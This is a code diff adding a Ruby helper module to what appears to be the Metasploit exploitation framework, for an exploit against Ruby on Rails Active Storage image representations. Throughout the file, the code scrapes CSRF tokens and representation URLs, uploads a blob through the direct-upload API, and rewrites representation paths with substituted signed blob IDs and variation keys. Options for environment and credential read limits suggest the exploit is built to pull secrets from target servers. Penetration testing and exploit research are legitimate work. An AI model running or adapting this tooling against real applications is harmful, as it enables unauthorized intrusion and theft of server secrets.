+++ lib/msf/core/exploit/remote/http/rails_active_storage_vips/active_storage.rb
@@ -1,0 +1,331 @@
+# frozen_string_literal: true
+
+require 'base64'
+require 'digest/md5'
+require 'json'
+require 'uri'
+require 'zlib'
+
+module Msf::Exploit::Remote::HTTP::RailsActiveStorageVips
+  # Active Storage page, route, direct-upload, and representation workflow helpers.
+  module ActiveStorage
+    # Associates a vulnerability report with the Rails Active Storage service.
+    #
+    # @param opts [Hash] options passed to the framework vulnerability reporter
+    # @return [Object, nil] the framework reporting result
+    def report_vuln(opts = {})
+      service = opts[:service] || @active_storage_service || report_active_storage_service
+      opts = opts.merge(service: service) if service
+      result = super(opts)
+      @vulnerability_reported = true if result
+      result
+    end
+
+    # Returns session-inference details for the Rails application service.
+    #
+    # @return [Hash] the inherited service details with the Rails service name
+    def service_details
+      super.merge(service_name: 'rails')
+    end
+
+    private
+
+    def report_active_storage_service
+      return @active_storage_service if @active_storage_service
+
+      common = { host: rhost, port: rport, proto: 'tcp' }
+      tcp_service = common.merge(name: 'tcp', parents: nil)
+      web_service = if ssl
+                      common.merge(
+                        name: 'https',
+                        parents: common.merge(name: 'ssl', parents: tcp_service)
+                      )
+                    else
+                      common.merge(name: 'http', parents: tcp_service)
+                    end
+
+      @active_storage_service = report_service(
+        common.merge(
+          name: 'rails',
+          info: 'Ruby on Rails Active Storage',
+          resource: { uri: normalize_uri(target_uri.path) },
+          parents: web_service
+        )
+      )
+    end
+
+    def validate_options!
+      raise ConfigError, 'REPRESENTATION_INDEX must be non-negative' if datastore['REPRESENTATION_INDEX'].negative?
+      raise ConfigError, 'EnvironmentMaxBytes must be at least 1024' if datastore['EnvironmentMaxBytes'] < 1024
+      raise ConfigError, 'CredentialsMaxBytes must be at least 1024' if datastore['CredentialsMaxBytes'] < 1024
+      raise ConfigError, 'MaxReadRequests must be positive' unless datastore['MaxReadRequests'].positive?
+
+      external_storage_origins
+    end
+
+    def app_uri(path)
+      normalize_uri(target_uri.path, path)
+    end
+
+    def csrf_token
+      return datastore['CSRF_TOKEN'] if datastore['CSRF_TOKEN'].present?
+
+      landing_page[:csrf]
+    end
+
+    def landing_page
+      return @landing_page if @landing_page
+
+      res = send_request_cgi(target_request('GET', app_uri(datastore['LANDINGURI'])))
+      raise UnreachableError, 'No response from the landing page' unless res
+      raise FlowError, "Landing page returned HTTP #{res.code}" unless res.code == 200
+
+      doc = res.get_html_document
+      csrf_meta = doc.at_css('meta[name="csrf-token"]')&.[]('content')
+      csrf_form = doc.at_css('input[name="authenticity_token"]')&.[]('value')
+      csrf = csrf_meta.presence || csrf_form
+      raise FlowError, 'Landing page did not contain a CSRF token' if csrf.blank? && datastore['CSRF_TOKEN'].blank?
+
+      @landing_page = {
+        csrf: csrf,
+        csrf_meta: csrf_meta,
+        csrf_form: csrf_form,
+        representation_paths: representation_paths(doc)
+      }
+    end
+
+    def representation_paths(doc)
+      paths = doc.css('img[src]').map { |node| node['src'] }
+      srcset_paths = doc.css('img[srcset]').flat_map do |node|
+        node['srcset'].to_s.split(',').map { |entry| entry.strip.split(/\s+/, 2).first }
+      end
+      (paths + srcset_paths).compact.select { |path| representation_path?(path) }.uniq
+    end
+
+    def representation_path?(path)
+      parsed_path = URI.parse(path).path
+      return false unless parsed_path
+
+      representation_route_index(parsed_path.split('/'))
+      true
+    rescue FlowError, URI::Error
+      false
+    end
+
+    def base_representation_path
+      return @base_representation_path if @base_representation_path
+
+      if datastore['VARIATION_KEY'].present?
+        raise FlowError, 'VARIATION_KEY is handled through standard Active Storage representation routes'
+      end
+
+      if datastore['REPRESENTATIONURI'].present?
+        @base_representation_path = select_representation_path([datastore['REPRESENTATIONURI']], 'REPRESENTATIONURI')
+        print_status('Using the operator-supplied Active Storage representation URL')
+        return @base_representation_path
+      end
+
+      landing = landing_page
+      if landing[:representation_paths].any?
+        @base_representation_path = select_representation_path(landing[:representation_paths], 'landing page')
+        print_status('Reusing an Active Storage representation URL found on the landing page')
+        return @base_representation_path
+      end
+
+      signed_id = direct_upload(
+        csrf_token: csrf_token,
+        filename: 'safe.png',
+        content_type: 'image/png',
+        content: safe_png
+      )
+      @base_representation_path = submit_safe_upload(landing[:csrf_form].presence || csrf_token, signed_id)
+    end
+
+    def select_representation_path(paths, source)
+      index = datastore['REPRESENTATION_INDEX']
+      raise FlowError, "#{source} did not contain a representation path" if paths.empty?
+      raise FlowError, "#{source} did not contain representation index #{index}" unless paths[index]
+
+      parsed = URI.parse(paths[index])
+      raise FlowError, "#{source} returned a non-hierarchical representation path" unless parsed.path
+
+      representation_route_index(parsed.path.split('/'))
+      paths[index]
+    rescue URI::Error => e
+      raise FlowError, "#{source} returned an invalid representation path: #{e.message}"
+    end
+
+    def direct_upload(csrf_token:, filename:, content_type:, content:)
+      checksum = Base64.strict_encode64(Digest::MD5.digest(content))
+      body = {
+        blob: {
+          filename: filename,
+          byte_size: content.bytesize,
+          checksum: checksum,
+          content_type: content_type
+        }
+      }.to_json
+
+      res = send_request_cgi(
+        target_request(
+          'POST',
+          app_uri(datastore['DIRECTUPLOADURI']),
+          'ctype' => 'application/json',
+          'headers' => {
+            'Accept' => 'application/json',
+            'X-CSRF-Token' => csrf_token
+          },
+          'data' => body
+        )
+      )
+      raise UnreachableError, 'No response while creating the direct upload' unless res
+      raise FlowError, "Direct upload create returned HTTP #{res.code}" unless res.code == 200
+
+      json = res.get_json_document
+      raise FlowError, 'Direct upload response was not a JSON object' unless json.is_a?(Hash)
+
+      signed_id = json['signed_id']
+      direct = json['direct_upload']
+      raise FlowError, 'Direct upload response did not include a signed_id' if signed_id.blank?
+      raise FlowError, 'Direct upload response did not include upload metadata' unless direct.is_a?(Hash)
+
+      upload_url = direct['url']
+      upload_headers = direct['headers']
+      raise FlowError, 'Direct upload response did not include an upload URL' if upload_url.blank?
+      raise FlowError, 'Direct upload response did not include upload headers' unless upload_headers.is_a?(Hash)
+
+      @active_storage_service = report_active_storage_service
+
+      upload_res = send_request_to_url(upload_url, method: 'PUT', data: content, headers: upload_headers)
+      raise UnreachableError, 'No response while uploading the blob content' unless upload_res
+      unless [200, 201, 204].include?(upload_res.code)
+        raise FlowError, "Direct object upload returned HTTP #{upload_res.code}"
+      end
+
+      signed_id
+    end
+
+    def submit_safe_upload(csrf_token, signed_id)
+      current_uri = URI.parse(full_uri(app_uri(datastore['SUBMITURI'])))
+      res = send_request_cgi(
+        target_request(
+          'POST',
+          app_uri(datastore['SUBMITURI']),
+          'vars_post' => {
+            'authenticity_token' => csrf_token,
+            datastore['ATTACHMENT_FIELD'] => signed_id
+          },
+          'headers' => { 'Accept' => 'text/html' }
+        )
+      )
+      raise UnreachableError, 'No response while submitting the safe upload' unless res
+
+      redirect_count = 0
+      while res.redirect?
+        unless [301, 302, 303].include?(res.code) && res.redirection.present?
+          raise FlowError, "Safe upload submit returned unsupported HTTP #{res.code} redirect"
+        end
+        raise FlowError, 'Safe upload response exceeded the redirect limit' if redirect_count == REPRESENTATION_REDIRECT_LIMIT
+
+        current_uri = URI.join(current_uri.to_s, res.redirection.to_s)
+        validate_http_url!(current_uri, 'Safe upload redirect')
+        res = send_request_cgi(
+          target_request(
+            'GET',
+            request_uri(current_uri.to_s),
+            'headers' => { 'Accept' => 'text/html' }
+          )
+        )
+        raise UnreachableError, 'No response while following the safe upload redirect' unless res
+
+        redirect_count += 1
+      end
+      raise FlowError, "Safe upload response returned HTTP #{res.code}" unless res.code == 200
+
+      select_representation_path(representation_paths(res.get_html_document), 'safe upload response')
+    rescue URI::Error => e
+      raise FlowError, "Safe upload redirect was invalid: #{e.message}"
+    end
+
+    def safe_png
+      signature = "\x89PNG\r\n\x1a\n".b
+      ihdr = [8, 8, 8, 0, 0, 0, 0].pack('NNC5')
+      raw = (("\x00" + ("\x00" * 8)) * 8).b
+      signature + png_chunk('IHDR', ihdr) + png_chunk('IDAT', Zlib::Deflate.deflate(raw)) + png_chunk('IEND', ''.b)
+    end
+
+    def png_chunk(type, data)
+      [data.bytesize].pack('N') + type + data + [Zlib.crc32(type + data)].pack('N')
+    end
+
+    def substitute_representation_blob(path, signed_blob_id, filename)
+      parsed = URI.parse(path)
+      parts = parsed.path.split('/')
+      route_index = representation_route_index(parts)
+      parts[route_index + 1] = URI.encode_www_form_component(signed_blob_id)
+      parts[-1] = filename
+      parsed.path = parts.join('/')
+      parsed.to_s
+    rescue URI::Error => e
+      raise FlowError, "Application returned an invalid representation path: #{e.message}"
+    end
+
+    def substitute_variation_key(path, variation)
+      parsed = URI.parse(path)
+      parts = parsed.path.split('/')
+      route_index = representation_route_index(parts)
+      parts[route_index + 2] = URI.encode_www_form_component(variation)
+      parsed.path = parts.join('/')
+      parsed.to_s
+    rescue URI::Error => e
+      raise FlowError, "Application returned an invalid representation path: #{e.message}"
+    end
+
+    def standard_representation_path(signed_id, variation, filename, route: :redirect)
+      direct_upload_path = URI.parse(app_uri(datastore['DIRECTUPLOADURI'])).path
+      suffix = '/direct_uploads'
+      unless direct_upload_path.end_with?(suffix)
+        raise ConfigError, 'DIRECTUPLOADURI must end in /direct_uploads when constructing a standard representation route'
+      end
+
+      prefix = direct_upload_path.delete_suffix(suffix)
+      unless %i[redirect legacy].include?(route)
+        raise ConfigError, "Unsupported Active Storage representation route #{route}"
+      end
+
+      parts = [prefix, 'representations']
+      parts << 'redirect' if route == :redirect
+      parts.concat(
+        [
+          URI.encode_www_form_component(signed_id),
+          URI.encode_www_form_component(variation),
+          filename
+        ]
+      )
+      normalize_uri(*parts)
+    rescue URI::Error => e
+      raise ConfigError, "DIRECTUPLOADURI was invalid: #{e.message}"
+    end
+
+    def representation_route_index(parts)
+      representations_indexes = parts.each_index.select { |index| parts[index] == 'representations' }
+      raise FlowError, 'Representation path did not contain /representations/' if representations_indexes.empty?
+
+      route_index = nil
+      representations_indexes.reverse_each do |representations_index|
+        candidate = if %w[redirect proxy].include?(parts[representations_index + 1])
+                      representations_index + 1
+                    else
+                      representations_index
+                    end
+        if candidate + 3 < parts.length
+          route_index = candidate
+          break
+        end
+      end
+      raise FlowError, 'Representation path was shorter than expected' unless route_index
+
+      route_index
+    end
+  end
+end
